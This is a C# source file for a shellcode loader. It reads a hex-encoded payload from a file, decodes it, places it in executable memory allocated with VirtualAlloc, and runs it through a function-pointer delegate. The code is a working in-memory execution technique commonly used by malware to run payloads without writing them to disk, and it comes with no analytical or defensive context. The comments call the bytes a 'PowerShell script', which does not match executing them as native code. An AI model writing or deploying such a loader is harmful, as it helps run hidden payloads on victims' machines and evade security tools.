using System;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    static void Main(string[] args)
    {
        // Read the hex string from file
        string hex = ReadHexFile("hex_exe.hex");

        // Convert the hex string to a byte array
        byte[] scriptBytes = ConvertHexToBytes(hex);

        // Allocate memory for the script
        IntPtr buffer = AllocateMemory((uint)scriptBytes.Length);

        // Write the script to the allocated memory
        WriteToMemory(buffer, scriptBytes);

        // Create a delegate for the PowerShell execution
        var invoke = CreateDelegate(buffer);

        // Execute the script
        invoke();
    }

    static string ReadHexFile(string filePath)
    {
        return File.ReadAllText(filePath); // Reads the content of the file
    }

    static byte[] ConvertHexToBytes(string hex)
    {
        return Enumerable.Range(0, hex.Length)
            .Where(x => x % 2 == 0)
            .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
            .ToArray(); // Converts hex string to byte array
    }

    static IntPtr AllocateMemory(uint size)
    {
        return VirtualAlloc(IntPtr.Zero, size, 0x1000 | 0x2000, 0x40); // Allocates memory
    }

    static void WriteToMemory(IntPtr buffer, byte[] scriptBytes)
    {
        Marshal.Copy(scriptBytes, 0, buffer, scriptBytes.Length); // Writes bytes to allocated memory
    }

    static Action CreateDelegate(IntPtr buffer)
    {
        return (Action)Marshal.GetDelegateForFunctionPointer(buffer, typeof(Action)); // Create delegate from function pointer
    }
}
